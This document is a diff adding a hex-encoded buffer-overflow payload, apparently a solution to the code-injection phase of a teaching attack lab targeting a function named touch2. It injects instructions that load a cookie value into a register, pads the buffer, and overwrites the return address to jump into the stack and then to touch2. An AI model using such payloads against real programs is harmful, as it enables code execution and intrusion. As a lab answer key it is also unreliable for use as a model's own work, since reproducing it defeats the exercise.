@@ -1,0 +1,12 @@
+bf df 1f ee 10 c3 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+e8 6e 65 55 00 00 00 00
+b4 13 40 00
+
+(mov cookie to rdi, return)
+(empty buffer)
+(return address to rsp)
+(return address to touch2)
